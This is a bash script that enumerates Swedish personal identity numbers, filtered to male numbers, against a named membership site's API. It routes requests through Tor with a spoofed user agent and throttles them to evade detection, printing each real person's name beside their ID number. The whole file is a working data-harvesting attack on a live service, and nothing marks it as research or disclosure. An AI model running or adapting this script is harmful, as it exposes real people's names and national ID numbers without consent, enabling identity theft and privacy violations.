#!/bin/bash

ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"


while :; do
	ssn=$(node index.js)
	split=$(echo "$ssn" | sed 's/\([0-9]\)/\1 /g')
	mf=$(echo "$split" | awk '{print $11}')
	if [ $((mf % 2)) -eq 0 ] ; then
		continue
	fi

	data=$(curl -sL -A "$ua" --socks5-hostname localhost:9150 medlem.mattecentrum.se/api/frontend/person \
		-H 'DNT: 1' \
		-H 'Content-Type: application/json;charset=UTF-8' \
		--data-raw "{\"personalNumber\":\"$ssn\"}" \
		--compressed)

	name=$(echo "$data" | jq -r .name)
	if [ "$name" == "null" ] ; then
		echo "$ssn is invalid"
		sleep 11
		continue
	fi

	echo "$name"
	echo "$ssn" | sed 's/\([0-9]\{8\}\)\(.*\)/\1-\2/g'
	sleep 11
done
